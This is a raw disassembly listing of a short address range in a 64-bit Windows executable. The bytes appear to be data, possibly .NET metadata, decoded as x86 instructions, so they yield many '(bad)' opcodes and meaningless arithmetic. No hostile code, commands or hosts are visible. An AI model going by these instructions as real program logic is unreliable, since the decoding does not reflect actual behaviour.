   14000301f:	09 1d 05 ab 00 5d    	or     %ebx,0x5d00ab05(%rip)        # 0x19d00db2a
   140003025:	06                   	(bad)
   140003026:	00 00                	add    %al,(%rax)
   140003028:	06                   	(bad)
   140003029:	00 e1                	add    %ah,%cl
   14000302b:	0a 2c 00             	or     (%rax,%rax,1),%ch
   14000302e:	06                   	(bad)
   14000302f:	00 84 0a 2c 00 0a 00 	add    %al,0xa002c(%rdx,%rcx,1)
   140003036:	9c                   	pushf
   140003037:	01 14 07             	add    %edx,(%rdi,%rax,1)
   14000303a:	06                   	(bad)
   14000303b:	00 2a                	add    %ch,(%rdx)
   14000303d:	02 83 00 06 00 1d    	add    0x1d000600(%rbx),%al
   140003043:	06                   	(bad)
   140003044:	83 00 06             	addl   $0x6,(%rax)
   140003047:	00 e7                	add    %ah,%bh
   140003049:	05 71 05 06 00       	add    $0x60571,%eax
   14000304e:	4d 06                	rex.WRB (bad)
   140003050:	1d 05 06 00 04       	sbb    $0x4000605,%eax
   140003055:	0b d1                	or     %ecx,%edx
   140003057:	04 06                	add    $0x6,%al
   140003059:	00 eb                	add    %ch,%bl
   14000305b:	04 d1                	add    $0xd1,%al
   14000305d:	04 06                	add    $0x6,%al
   14000305f:	00 7a 01             	add    %bh,0x1(%rdx)
   140003062:	d1 04 06             	roll   $1,(%rsi,%rax,1)
   140003065:	00 de                	add    %bl,%dh
   140003067:	05 83 00 06 00       	add    $0x60083,%eax
   14000306c:	fd                   	std
   14000306d:	05 83 00 06 00       	add    $0x60083,%eax
   140003072:	38 04 1d 05 0e 00 61 	cmp    %al,0x61000e05(,%rbx,1)
   140003079:	0a 40 08             	or     0x8(%rax),%al
   14000307c:	0e                   	(bad)
   14000307d:	00 f3                	add    %dh,%bl
   14000307f:	08 40 08             	or     %al,0x8(%rax)
   140003082:	0e                   	(bad)
   140003083:	00 71 08             	add    %dh,0x8(%rcx)
   140003086:	40 08 0e             	rex or %cl,(%rsi)
   140003089:	00 39                	add    %bh,(%rcx)
   14000308b:	05 40 08 06 00       	add    $0x60840,%eax
   140003090:	41 06                	rex.B (bad)
   140003092:	1d 05 12 00 4c       	sbb    $0x4c001205,%eax
   140003097:	01 35 06 06 00 ce    	add    %esi,-0x31fff9fa(%rip)        # 0x10e0036a3
   14000309d:	07                   	(bad)
   14000309e:	83 00 0a             	addl   $0xa,(%rax)
   1400030a1:	00 0c 06             	add    %cl,(%rsi,%rax,1)
   1400030a4:	14 07                	adc    $0x7,%al
   1400030a6:	06                   	(bad)
   1400030a7:	00 a7 05 1d 05 00    	add    %ah,0x51d05(%rdi)
   1400030ad:	00 00                	add    %al,(%rax)
   1400030af:	00 7a 00             	add    %bh,0x0(%rdx)
   1400030b2:	00 00                	add    %al,(%rax)
   1400030b4:	00 00                	add    %al,(%rax)
   1400030b6:	01 00                	add    %eax,(%rax)
   1400030b8:	01 00                	add    %eax,(%rax)
   1400030ba:	00 00                	add    %al,(%rax)
   1400030bc:	10 00                	adc    %al,(%rax)
   1400030be:	01 05 8d 00 41 00    	add    %eax,0x41008d(%rip)        # 0x140413151
   1400030c4:	01 00                	add    %eax,(%rax)
   1400030c6:	01 00                	add    %eax,(%rax)
   1400030c8:	03 01                	add    (%rcx),%eax
   1400030ca:	10 00                	adc    %al,(%rax)
   1400030cc:	6b 00 00             	imul   $0x0,(%rax),%eax
   1400030cf:	00 41 00             	add    %al,0x0(%rcx)
   1400030d2:	05 00 10 00 11       	add    $0x11001000,%eax
   1400030d7:	00 f9                	add    %bh,%cl
   1400030d9:	00 3f                	add    %bh,(%rdi)
   1400030db:	02 11                	add    (%rcx),%dl
   1400030dd:	00 ed                	add    %ch,%ch
   1400030df:	01 42 02             	add    %eax,0x2(%rdx)
   1400030e2:	11 00                	adc    %eax,(%rax)
   1400030e4:	c4 07 45 02          	(bad)
   1400030e8:	11 00                	adc    %eax,(%rax)
   1400030ea:	a0 07 4a 02 01 00 70 	movabs 0x5102700001024a07,%al
   1400030f1:	02 51 
   1400030f3:	02 01                	add    (%rcx),%al
   1400030f5:	00 e9                	add    %ch,%cl
   1400030f7:	09 42 02             	or     %eax,0x2(%rdx)
   1400030fa:	01 00                	add    %eax,(%rax)
   1400030fc:	dd 00                	fldl   (%rax)
   1400030fe:	51                   	push   %rcx
   1400030ff:	02 01                	add    (%rcx),%al
   140003101:	00 19                	add    %bl,(%rcx)
   140003103:	0a 42 02             	or     0x2(%rdx),%al
   140003106:	06                   	(bad)
   140003107:	00 14 0a             	add    %dl,(%rdx,%rcx,1)
   14000310a:	42 02 01             	rex.X add (%rcx),%al
   14000310d:	00 c2                	add    %al,%dl
   14000310f:	05 42 02 06 00       	add    $0x60242,%eax
   140003114:	bd 05 42 02 01       	mov    $0x1024205,%ebp
   140003119:	00 3c 00             	add    %bh,(%rax,%rax,1)
   14000311c:	54                   	push   %rsp
   14000311d:	02 01                	add    (%rcx),%al
   14000311f:	00 4a 00             	add    %cl,0x0(%rdx)
   140003122:	42 02 01             	rex.X add (%rcx),%al
   140003125:	00 55 00             	add    %dl,0x0(%rbp)
   140003128:	5c                   	pop    %rsp
   140003129:	02 01                	add    (%rcx),%al
   14000312b:	00 60 00             	add    %ah,0x0(%rax)
   14000312e:	51                   	push   %rcx
   14000312f:	02 48 20             	add    0x20(%rax),%cl
   140003132:	00 00                	add    %al,(%rax)
   140003134:	00 00                	add    %al,(%rax)
   140003136:	91                   	xchg   %eax,%ecx
   140003137:	00 34 05 60 02 01 00 	add    %dh,0x10260(,%rax,1)
   14000313e:	f4                   	hlt
   14000313f:	20 00                	and    %al,(%rax)
   140003141:	00 00                	add    %al,(%rax)
   140003143:	00 91 00 84 07 66    	add    %dl,0x66078400(%rcx)
   140003149:	02 02                	add    (%rdx),%al
   14000314b:	00 0c 21             	add    %cl,(%rcx,%riz,1)
   14000314e:	00 00                	add    %al,(%rax)
   140003150:	00 00                	add    %al,(%rax)
   140003152:	91                   	xchg   %eax,%ecx
   140003153:	00 8d 07 70 02 04    	add    %cl,0x4027007(%rbp)
   140003159:	00 70 21             	add    %dh,0x21(%rax)
   14000315c:	00 00                	add    %al,(%rax)
   14000315e:	00 00                	add    %al,(%rax)
   140003160:	91                   	xchg   %eax,%ecx
   140003161:	00 f6                	add    %dh,%dh
   140003163:	09 70 02             	or     %esi,0x2(%rax)
   140003166:	04 00                	add    $0x0,%al
   140003168:	10 23                	adc    %ah,(%rbx)
   14000316a:	00 00                	add    %al,(%rax)
   14000316c:	00 00                	add    %al,(%rax)
   14000316e:	91                   	xchg   %eax,%ecx
   14000316f:	00 1e                	add    %bl,(%rsi)
   140003171:	08 70 02             	or     %dh,0x2(%rax)
   140003174:	04 00                	add    $0x0,%al
   140003176:	30 24 00             	xor    %ah,(%rax,%rax,1)
   140003179:	00 00                	add    %al,(%rax)
   14000317b:	00 91 00 08 01 12    	add    %dl,0x12010800(%rcx)
   140003181:	02 04 00             	add    (%rax,%rax,1),%al
   140003184:	f8                   	clc
   140003185:	24 00                	and    $0x0,%al
   140003187:	00 00                	add    %al,(%rax)
   140003189:	00 91 00 1a 01 70    	add    %dl,0x70011a00(%rcx)
   14000318f:	02 04 00             	add    (%rax,%rax,1),%al
   140003192:	60                   	(bad)
   140003193:	27                   	(bad)
   140003194:	00 00                	add    %al,(%rax)
   140003196:	00 00                	add    %al,(%rax)
   140003198:	91                   	xchg   %eax,%ecx
   140003199:	00 d0                	add    %dl,%al
   14000319b:	05 70 02 04 00       	add    $0x40270,%eax
   1400031a0:	60                   	(bad)
   1400031a1:	28 00                	sub    %al,(%rax)
   1400031a3:	00 00                	add    %al,(%rax)
   1400031a5:	00 91 00 09 05 70    	add    %dl,0x70050900(%rcx)
   1400031ab:	02 04 00             	add    (%rax,%rax,1),%al
   1400031ae:	28 29                	sub    %ch,(%rcx)
   1400031b0:	00 00                	add    %al,(%rax)
   1400031b2:	00 00                	add    %al,(%rax)
   1400031b4:	91                   	xchg   %eax,%ecx
   1400031b5:	00 34 0a             	add    %dh,(%rdx,%rcx,1)
   1400031b8:	05 02 04 00 78       	add    $0x78000402,%eax
   1400031bd:	29 00                	sub    %eax,(%rax)
   1400031bf:	00 00                	add    %al,(%rax)
   1400031c1:	00 91 00 43 0a 56    	add    %dl,0x560a4300(%rcx)
   1400031c7:	00 05 00 48 2a 00    	add    %al,0x2a4800(%rip)        # 0x1402a79cd
   1400031cd:	00 00                	add    %al,(%rax)
   1400031cf:	00 91 00 63 01 74    	add    %dl,0x74016300(%rcx)
   1400031d5:	02 05 00 54 2c 00    	add    0x2c5400(%rip),%al        # 0x1402c85db
   1400031db:	00 00                	add    %al,(%rax)
   1400031dd:	00 91 00 a5 04 7a    	add    %dl,0x7a04a500(%rcx)
   1400031e3:	02 07                	add    (%rdi),%al
   1400031e5:	00 56 2c             	add    %dl,0x2c(%rsi)
   1400031e8:	00 00                	add    %al,(%rax)
   1400031ea:	00 00                	add    %al,(%rax)
   1400031ec:	86 18                	xchg   %bl,(%rax)
   1400031ee:	07                   	(bad)
   1400031ef:	07                   	(bad)
   1400031f0:	06                   	(bad)
   1400031f1:	00 0a                	add    %cl,(%rdx)
   1400031f3:	00 5e 2c             	add    %bl,0x2c(%rsi)
   1400031f6:	00 00                	add    %al,(%rax)
   1400031f8:	00 00                	add    %al,(%rax)
   1400031fa:	91                   	xchg   %eax,%ecx
   1400031fb:	18 0d 07 70 02 0a    	sbb    %cl,0xa027007(%rip)        # 0x14a02a208
   140003201:	00 7a 2c             	add    %bh,0x2c(%rdx)
   140003204:	00 00                	add    %al,(%rax)
   140003206:	00 00                	add    %al,(%rax)
   140003208:	86 18                	xchg   %bl,(%rax)
   14000320a:	07                   	(bad)
   14000320b:	07                   	(bad)
   14000320c:	01 00                	add    %eax,(%rax)
   14000320e:	0a 00                	or     (%rax),%al
   140003210:	94                   	xchg   %eax,%esp
   140003211:	2c 00                	sub    $0x0,%al
   140003213:	00 00                	add    %al,(%rax)
   140003215:	00 e1                	add    %ah,%cl
   140003217:	01 55 02             	add    %edx,0x2(%rbp)
   14000321a:	06                   	(bad)
   14000321b:	00 0b                	add    %cl,(%rbx)
   14000321d:	00 98 2c 00 00 00    	add    %bl,0x2c(%rax)
   140003223:	00 e1                	add    %ah,%cl
   140003225:	01 4b 0a             	add    %ecx,0xa(%rbx)
   140003228:	20 00                	and    %al,(%rax)
   14000322a:	0b 00                	or     (%rax),%eax
   14000322c:	d8 2d 00 00 00 00    	fsubrs 0x0(%rip)        # 0x140003232
   140003232:	e1 09                	loope  0x14000323d
   140003234:	71 09                	jno    0x14000323f
   140003236:	4d 00 0b             	rex.WRB add %r9b,(%r11)
   140003239:	00 e0                	add    %ah,%al
   14000323b:	2d 00 00 00 00       	sub    $0x0,%eax
   140003240:	e1 01                	loope  0x140003243
   140003242:	c3                   	ret
   140003243:	08 06                	or     %al,(%rsi)
   140003245:	00 0b                	add    %cl,(%rbx)
   140003247:	00 e7                	add    %ah,%bh
   140003249:	2d 00 00 00 00       	sub    $0x0,%eax
   14000324e:	e1 09                	loope  0x140003259
   140003250:	b3 09                	mov    $0x9,%bl
   140003252:	2f                   	(bad)
   140003253:	00 0b                	add    %cl,(%rbx)
   140003255:	00 f0                	add    %dh,%al
   140003257:	2d 00 00 00 00       	sub    $0x0,%eax
   14000325c:	e1 01                	loope  0x14000325f
   14000325e:	96                   	xchg   %eax,%esi
   14000325f:	06                   	(bad)
   140003260:	82                   	(bad)
   140003261:	02 0b                	add    (%rbx),%cl
   140003263:	00 3f                	add    %bh,(%rdi)
   140003265:	2e 00 00             	cs add %al,(%rax)
   140003268:	00 00                	add    %al,(%rax)
   14000326a:	e1 01                	loope  0x14000326d
   14000326c:	da 06                	fiaddl (%rsi)
   14000326e:	42 00 0b             	rex.X add %cl,(%rbx)
   140003271:	00 00                	add    %al,(%rax)
   140003273:	00 01                	add    %al,(%rcx)
   140003275:	00 3b                	add    %bh,(%rbx)
   140003277:	08 00                	or     %al,(%rax)
   140003279:	00 01                	add    %al,(%rcx)
   14000327b:	00 19                	add    %bl,(%rcx)
   14000327d:	0a 00                	or     (%rax),%al
   14000327f:	00 02                	add    %al,(%rdx)
   140003281:	00 c2                	add    %al,%dl
   140003283:	05 00 00 01 00       	add    $0x10000,%eax
   140003288:	c1 04 00 00          	roll   $0x0,(%rax,%rax,1)
   14000328c:	01 00                	add    %eax,(%rax)
   14000328e:	6c                   	insb   (%dx),(%rdi)
   14000328f:	01 10                	add    %edx,(%rax)
   140003291:	10 02                	adc    %al,(%rdx)
   140003293:	00 2a                	add    %ch,(%rdx)
   140003295:	0a 00                	or     (%rax),%al
   140003297:	00 01                	add    %al,(%rcx)
   140003299:	00 46 06             	add    %al,0x6(%rsi)
   14000329c:	00 00                	add    %al,(%rax)
   14000329e:	02 00                	add    (%rax),%al
   1400032a0:	43 01 00             	rex.XB add %eax,(%r8)
   1400032a3:	00 03                	add    %al,(%rbx)
   1400032a5:	00 84 06 00 00 01 00 	add    %al,0x10000(%rsi,%rax,1)
   1400032ac:	70 02                	jo     0x1400032b0
   1400032ae:	03 00                	add    (%rax),%eax
   1400032b0:	0a 00                	or     (%rax),%al
   1400032b2:	03 00                	add    (%rax),%eax
   1400032b4:	81 00 03 00 06 00    	addl   $0x60003,(%rax)
   1400032ba:	03 00                	add    (%rax),%eax
   1400032bc:	79 00                	jns    0x1400032be
   1400032be:	03 00                	add    (%rax),%eax
   1400032c0:	7d 00                	jge    0x1400032c2
   1400032c2:	09 00                	or     %eax,(%rax)
   1400032c4:	07                   	(bad)
   1400032c5:	07                   	(bad)
   1400032c6:	01 00                	add    %eax,(%rax)
   1400032c8:	11 00                	adc    %eax,(%rax)
   1400032ca:	07                   	(bad)
   1400032cb:	07                   	(bad)
   1400032cc:	06                   	(bad)
   1400032cd:	00 19                	add    %bl,(%rcx)
   1400032cf:	00 07                	add    %al,(%rdi)
   1400032d1:	07                   	(bad)
   1400032d2:	0a 00                	or     (%rax),%al
   1400032d4:	29 00                	sub    %eax,(%rax)
   1400032d6:	07                   	(bad)
   1400032d7:	07                   	(bad)
   1400032d8:	10 00                	adc    %al,(%rax)
   1400032da:	31 00                	xor    %eax,(%rax)
   1400032dc:	07                   	(bad)
   1400032dd:	07                   	(bad)
   1400032de:	10 00                	adc    %al,(%rax)
   1400032e0:	39 00                	cmp    %eax,(%rax)
   1400032e2:	07                   	(bad)
   1400032e3:	07                   	(bad)
   1400032e4:	10 00                	adc    %al,(%rax)
   1400032e6:	41 00 07             	add    %al,(%r15)
   1400032e9:	07                   	(bad)
   1400032ea:	10 00                	adc    %al,(%rax)
   1400032ec:	49 00 07             	rex.WB add %al,(%r15)
   1400032ef:	07                   	(bad)
   1400032f0:	10 00                	adc    %al,(%rax)
   1400032f2:	51                   	push   %rcx
   1400032f3:	00 07                	add    %al,(%rdi)
   1400032f5:	07                   	(bad)
   1400032f6:	10 00                	adc    %al,(%rax)
   1400032f8:	59                   	pop    %rcx
   1400032f9:	00 07                	add    %al,(%rdi)
   1400032fb:	07                   	(bad)
   1400032fc:	10 00                	adc    %al,(%rax)
   1400032fe:	61                   	(bad)
   1400032ff:	00 07                	add    %al,(%rdi)
   140003301:	07                   	(bad)
   140003302:	15 00 69 00 07       	adc    $0x7006900,%eax
   140003307:	07                   	(bad)
   140003308:	10 00                	adc    %al,(%rax)
   14000330a:	71 00                	jno    0x14000330c
   14000330c:	07                   	(bad)
   14000330d:	07                   	(bad)
   14000330e:	10 00                	adc    %al,(%rax)
   140003310:	79 00                	jns    0x140003312
   140003312:	07                   	(bad)
   140003313:	07                   	(bad)
   140003314:	10 00                	adc    %al,(%rax)
   140003316:	a1 00 07 07 1a 00 e9 	movabs 0x700e9001a070700,%eax
   14000331d:	00 07 
   14000331f:	07                   	(bad)
   140003320:	06                   	(bad)
   140003321:	00 f1                	add    %dh,%cl
   140003323:	00 68 02             	add    %ch,0x2(%rax)
   140003326:	06                   	(bad)
   140003327:	00 f9                	add    %bh,%cl
   140003329:	00 4b 0a             	add    %cl,0xa(%rbx)
   14000332c:	20 00                	and    %al,(%rax)
   14000332e:	0c 00                	or     $0x0,%al
   140003330:	d2 09                	rorb   %cl,(%rcx)
   140003332:	2a 00                	sub    (%rax),%al
   140003334:	f9                   	stc
   140003335:	00 e2                	add    %ah,%dl
   140003337:	08 06                	or     %al,(%rsi)
   140003339:	00 f9                	add    %bh,%cl
   14000333b:	00 d2                	add    %dl,%dl
   14000333d:	09 2f                	or     %ebp,(%rdi)
   14000333f:	00 14 00             	add    %dl,(%rax,%rax,1)
   140003342:	f9                   	stc
   140003343:	06                   	(bad)
   140003344:	39 00                	cmp    %eax,(%rax)
   140003346:	01 01                	add    %eax,(%rcx)
   140003348:	f9                   	stc
   140003349:	06                   	(bad)
   14000334a:	42 00 11             	rex.X add %dl,(%rcx)
   14000334d:	01 07                	add    %eax,(%rdi)
   14000334f:	07                   	(bad)
   140003350:	06                   	(bad)
   140003351:	00 19                	add    %bl,(%rcx)
   140003353:	01 90 0a 47 00 19    	add    %edx,0x1900470a(%rax)
   140003359:	01 64 05 4d          	add    %esp,0x4d(%rbp,%rax,1)
   14000335d:	00 21                	add    %ah,(%rcx)
   14000335f:	01 c4                	add    %eax,%esp
   140003361:	01 51 00             	add    %edx,0x0(%rcx)
   140003364:	29 01                	sub    %eax,(%rcx)
   140003366:	bb 0a 56 00 31       	mov    $0x3100560a,%ebx
   14000336b:	01 aa 08 5a 00 39    	add    %ebp,0x39005a08(%rdx)
   140003371:	01 95 08 61 00 89    	add    %edx,-0x76ff9ef8(%rbp)
   140003377:	00 2e                	add    %ch,(%rsi)
   140003379:	0a 66 00             	or     0x0(%rsi),%ah
   14000337c:	41 01 07             	add    %eax,(%r15)
   14000337f:	07                   	(bad)
   140003380:	6c                   	insb   (%dx),(%rdi)
   140003381:	00 49 01             	add    %cl,0x1(%rcx)
   140003384:	07                   	(bad)
   140003385:	07                   	(bad)
   140003386:	72 00                	jb     0x140003388
   140003388:	49 01 2e             	add    %rbp,(%r14)
   14000338b:	0a 06                	or     (%rsi),%al
   14000338d:	00 89 00 b7 07 79    	add    %cl,0x7907b700(%rcx)
   140003393:	00 51 01             	add    %dl,0x1(%rcx)
   140003396:	b3 04                	mov    $0x4,%bl
   140003398:	88 00                	mov    %al,(%rax)
   14000339a:	21 01                	and    %eax,(%rcx)
   14000339c:	48 05 51 00 1c 00    	add    $0x1c0051,%rax
   1400033a2:	24 01                	and    $0x1,%al
   1400033a4:	95                   	xchg   %eax,%ebp
   1400033a5:	00 89 00 dd 01 4d    	add    %cl,0x4d01dd00(%rcx)
   1400033ab:	00 1c 00             	add    %bl,(%rax,%rax,1)
   1400033ae:	55                   	push   %rbp
   1400033af:	08 ad 00 31 01 83    	or     %ch,-0x7cfecf00(%rbp)
   1400033b5:	08 b3 00 61 01 6b    	or     %dh,0x6b016100(%rbx)
   1400033bb:	06                   	(bad)
   1400033bc:	b8 00 69 01 79       	mov    $0x79016900,%eax
   1400033c1:	0a bd 00 69 01 6c    	or     0x6c016900(%rbp),%bh
   1400033c7:	0a bd 00 89 00 8d    	or     -0x72ff7700(%rbp),%bh
   1400033cd:	01 c5                	add    %eax,%ebp
   1400033cf:	00 71 01             	add    %dh,0x1(%rcx)
   1400033d2:	aa                   	stos   %al,(%rdi)
   1400033d3:	01 4d 00             	add    %ecx,0x0(%rbp)
   1400033d6:	69 01 3d 04 cb 00    	imul   $0xcb043d,(%rcx),%eax
   1400033dc:	31 01                	xor    %eax,(%rcx)
   1400033de:	ea                   	(bad)
   1400033df:	0a d1                	or     %cl,%dl
   1400033e1:	00 89 00 f9 01 d7    	add    %cl,-0x28fe0700(%rcx)
   1400033e7:	00 89 00 fc 04 06    	add    %cl,0x604fc00(%rcx)
   1400033ed:	00 b9 00 37 01 4d    	add    %bh,0x4d013700(%rcx)
   1400033f3:	00 31                	add    %dh,(%rcx)
   1400033f5:	01 aa 08 de 00 49    	add    %ebp,0x4900de08(%rdx)
   1400033fb:	01 2b                	add    %ebp,(%rbx)
   1400033fd:	06                   	(bad)
   1400033fe:	e4 00                	in     $0x0,%al
   140003400:	c1 00 31             	roll   $0x31,(%rax)
   140003403:	08 fa                	or     %bh,%dl
   140003405:	00 c1                	add    %al,%cl
   140003407:	00 26                	add    %ah,(%rsi)
   140003409:	02 00                	add    (%rax),%al
   14000340b:	01 c1                	add    %eax,%ecx
   14000340d:	00 cf                	add    %cl,%bh
   14000340f:	0a 06                	or     (%rsi),%al
   140003411:	01 81 00 92 04 4d    	add    %eax,0x4d049200(%rcx)
   140003417:	00 31                	add    %dh,(%rcx)
   140003419:	01 5b 04             	add    %ebx,0x4(%rbx)
   14000341c:	0c 01                	or     $0x1,%al
   14000341e:	31 01                	xor    %eax,(%rcx)
   140003420:	9b                   	fwait
   140003421:	04 11                	add    $0x11,%al
   140003423:	01 31                	add    %esi,(%rcx)
   140003425:	01 aa 08 16 01 21    	add    %ebp,0x21011608(%rdx)
   14000342b:	01 0c 02             	add    %ecx,(%rdx,%rax,1)
   14000342e:	51                   	push   %rcx
   14000342f:	00 89 01 40 02 23    	add    %cl,0x23024001(%rcx)
   140003435:	01 c9                	add    %ecx,%ecx
   140003437:	00 b1 08 29 01 c9    	add    %dh,-0x36fed6f8(%rcx)
   14000343d:	00 54 0a 33          	add    %dl,0x33(%rdx,%rcx,1)
   140003441:	01 c9                	add    %ecx,%ecx
   140003443:	00 86 05 38 01 d1    	add    %al,-0x2efec7fb(%rsi)
   140003449:	00 9c 08 41 01 99 01 	add    %bl,0x1990141(%rax,%rcx,1)
   140003450:	de 09                	fimuls (%rcx)
   140003452:	57                   	push   %rdi
   140003453:	01 a1 01 07 07 5d    	add    %esp,0x5d070701(%rcx)
   140003459:	01 a1 01 71 01 64    	add    %esp,0x64017101(%rcx)
   14000345f:	01 69 01             	add    %ebp,0x1(%rcx)
   140003462:	46 04 6b             	rex.RX add $0x6b,%al
   140003465:	01 b1 01 07 07 10    	add    %esi,0x10070701(%rcx)
   14000346b:	00 b9 01 d0 01 4d    	add    %bh,0x4d01d001(%rcx)
   140003471:	00 21                	add    %ah,(%rcx)
   140003473:	01 08                	add    %ecx,(%rax)
   140003475:	0a 51 00             	or     0x0(%rcx),%dl
   140003478:	d9 00                	flds   (%rax)
   14000347a:	07                   	(bad)
   14000347b:	07                   	(bad)
   14000347c:	06                   	(bad)
   14000347d:	00 d9                	add    %bl,%cl
   14000347f:	00 4f 0a             	add    %cl,0xa(%rdi)
   140003482:	71 01                	jno    0x140003485
   140003484:	d9 00                	flds   (%rax)
   140003486:	14 08                	adc    $0x8,%al
   140003488:	77 01                	ja     0x14000348b
   14000348a:	39 01                	cmp    %eax,(%rcx)
   14000348c:	06                   	(bad)
   14000348d:	08 7d 01             	or     %bh,0x1(%rbp)
   140003490:	c9                   	leave
   140003491:	01 5c 0a 84          	add    %ebx,-0x7c(%rdx,%rcx,1)
   140003495:	01 c9                	add    %ecx,%ecx
   140003497:	00 92 04 97 01 51    	add    %dl,0x51019704(%rdx)
   14000349d:	01 ee                	add    %ebp,%esi
   14000349f:	08 e4                	or     %ah,%ah
   1400034a1:	00 69 01             	add    %ch,0x1(%rcx)
   1400034a4:	79 0a                	jns    0x1400034b0
   1400034a6:	a1 01 69 01 3d 04 a8 	movabs 0x3101a8043d016901,%eax
   1400034ad:	01 31 
   1400034af:	01 e8                	add    %ebp,%eax
   1400034b1:	08 ad 01 f1 01 02    	or     %ch,0x201f101(%rbp)
   1400034b7:	0a b4 01 31 01 f6 0a 	or     0xaf60131(%rcx,%rax,1),%dh
   1400034be:	d1 00                	roll   $1,(%rax)
   1400034c0:	29 01                	sub    %eax,(%rcx)
   1400034c2:	75 07                	jne    0x1400034cb
   1400034c4:	d0 01                	rolb   $1,(%rcx)
   1400034c6:	31 01                	xor    %eax,(%rcx)
   1400034c8:	c6 04 d6 01          	movb   $0x1,(%rsi,%rdx,8)
   1400034cc:	e9 01 92 04 4d       	jmp    0x18d04c6d2
   1400034d1:	00 39                	add    %bh,(%rcx)
   1400034d3:	01 b6 0a da 01 39    	add    %esi,0x3901da0a(%rsi)
   1400034d9:	01 f9                	add    %edi,%ecx
   1400034db:	07                   	(bad)
   1400034dc:	f0 01 39             	lock add %edi,(%rcx)
   1400034df:	01 dd                	add    %ebx,%ebp
   1400034e1:	07                   	(bad)
   1400034e2:	f6 01 39             	testb  $0x39,(%rcx)
   1400034e5:	01 eb                	add    %ebp,%ebx
   1400034e7:	07                   	(bad)
   1400034e8:	fd                   	std
   1400034e9:	01 19                	add    %ebx,(%rcx)
   1400034eb:	01 a5 0a 47 00 39    	add    %esp,0x3900470a(%rbp)
   1400034f1:	01 7b 02             	add    %edi,0x2(%rbx)
   1400034f4:	05 02 01 02 07       	add    $0x7020102,%eax
   1400034f9:	07                   	(bad)
   1400034fa:	06                   	(bad)
   1400034fb:	00 01                	add    %al,(%rcx)
   1400034fd:	02 9e 00 10 00 01    	add    0x1001000(%rsi),%bl
   140003503:	02 b7 01 10 00 89    	add    -0x76ffefff(%rdi),%dh
   140003509:	00 2e                	add    %ch,(%rsi)
   14000350b:	0a 0a                	or     (%rdx),%cl
   14000350d:	02 b9 00 28 01 4d    	add    0x4d012800(%rcx),%bh
   140003513:	00 81 00 07 07 06    	add    %al,0x6070700(%rcx)
   140003519:	00 1c 00             	add    %bl,(%rax,%rax,1)
   14000351c:	07                   	(bad)
   14000351d:	07                   	(bad)
   14000351e:	06                   	(bad)
   14000351f:	00 51 01             	add    %dl,0x1(%rcx)
   140003522:	c2 00 12             	ret    $0x1200
   140003525:	02 24 00             	add    (%rax,%rax,1),%ah
   140003528:	07                   	(bad)
   140003529:	07                   	(bad)
   14000352a:	06                   	(bad)
   14000352b:	00 24 00             	add    %ah,(%rax,%rax,1)
   14000352e:	ae                   	scas   (%rdi),%al
   14000352f:	04 95                	add    $0x95,%al
   140003531:	00 24 00             	add    %ah,(%rax,%rax,1)
   140003534:	31 06                	xor    %eax,(%rsi)
   140003536:	2a 00                	sub    (%rax),%al
   140003538:	29 01                	sub    %eax,(%rcx)
   14000353a:	84 07                	test   %al,(%rdi)
   14000353c:	28 02                	sub    %al,(%rdx)
   14000353e:	24 00                	and    $0x0,%al
   140003540:	fe 09                	decb   (%rcx)
   140003542:	d6                   	udb
   140003543:	01 09                	add    %ecx,(%rcx)
   140003545:	02 07                	add    (%rdi),%al
   140003547:	07                   	(bad)
   140003548:	06                   	(bad)
   140003549:	00 02                	add    %al,(%rdx)
   14000354b:	00 19                	add    %bl,(%rcx)
   14000354d:	00 3d 02 2e 00 0b    	add    %bh,0xb002e02(%rip)        # 0x14b006355
   140003553:	00 92 02 2e 00 13    	add    %dl,0x13002e02(%rdx)
   140003559:	00 9b 02 2e 00 1b    	add    %bl,0x1b002e02(%rbx)
   14000355f:	00 ba 02 2e 00 23    	add    %bh,0x23002e02(%rdx)
   140003565:	00 c3                	add    %al,%bl
   140003567:	02 2e                	add    (%rsi),%ch
   140003569:	00 2b                	add    %ch,(%rbx)
   14000356b:	00 dd                	add    %bl,%ch
   14000356d:	02 2e                	add    (%rsi),%ch
   14000356f:	00 33                	add    %dh,(%rbx)
   140003571:	00 1c 03             	add    %bl,(%rbx,%rax,1)
   140003574:	2e 00 3b             	cs add %bh,(%rbx)
   140003577:	00 22                	add    %ah,(%rdx)
   140003579:	03 2e                	add    (%rsi),%ebp
   14000357b:	00 43 00             	add    %al,0x0(%rbx)
   14000357e:	c3                   	ret
   14000357f:	02 2e                	add    (%rsi),%ch
   140003581:	00 4b 00             	add    %cl,0x0(%rbx)
   140003584:	31 03                	xor    %eax,(%rbx)
   140003586:	2e 00 53 00          	cs add %dl,0x0(%rbx)
   14000358a:	1c 03                	sbb    $0x3,%al
   14000358c:	2e 00 5b 00          	cs add %bl,0x0(%rbx)
   140003590:	1c 03                	sbb    $0x3,%al
   140003592:	2e 00 63 00          	cs add %ah,0x0(%rbx)
   140003596:	52                   	push   %rdx
   140003597:	03 2e                	add    (%rsi),%ebp
   140003599:	00 6b 00             	add    %ch,0x0(%rbx)
   14000359c:	7c 03                	jl     0x1400035a1
   14000359e:	2e 00 73 00          	cs add %dh,0x0(%rbx)
   1400035a2:	89 03                	mov    %eax,(%rbx)
   1400035a4:	40 00 7b 00          	add    %dil,0x0(%rbx)
   1400035a8:	d7                   	xlat   (%rbx)
   1400035a9:	03 63 00             	add    0x0(%rbx),%esp
   1400035ac:	83 00 fb             	addl   $0xfffffffb,(%rax)
   1400035af:	03 00                	add    (%rax),%eax
   1400035b1:	02 c3                	add    %bl,%al
   1400035b3:	00 fb                	add    %bh,%bl
   1400035b5:	03 20                	add    (%rax),%esp
   1400035b7:	02 c3                	add    %bl,%al
   1400035b9:	00 fb                	add    %bh,%bl
   1400035bb:	03 60 02             	add    0x2(%rax),%esp
   1400035be:	c3                   	ret
   1400035bf:	00 fb                	add    %bh,%bl
   1400035c1:	03 80 02 c3 00 fb    	add    -0x4ff3cfe(%rax),%eax
   1400035c7:	03 a0 02 c3 00 fb    	add    -0x4ff3cfe(%rax),%esp
   1400035cd:	03 c0                	add    %eax,%eax
   1400035cf:	02 c3                	add    %bl,%al
   1400035d1:	00 fb                	add    %bh,%bl
   1400035d3:	03 e0                	add    %eax,%esp
   1400035d5:	02 c3                	add    %bl,%al
   1400035d7:	00 fb                	add    %bh,%bl
   1400035d9:	03 7f 00             	add    0x0(%rdi),%edi
   1400035dc:	9b                   	fwait
   1400035dd:	00 e9                	add    %ch,%cl
   1400035df:	00 1c 01             	add    %bl,(%rcx,%rax,1)
   1400035e2:	45 01 92 01 9c 01 c4 	add    %r10d,-0x3bfe63ff(%r10)
   1400035e9:	01 e1                	add    %esp,%ecx
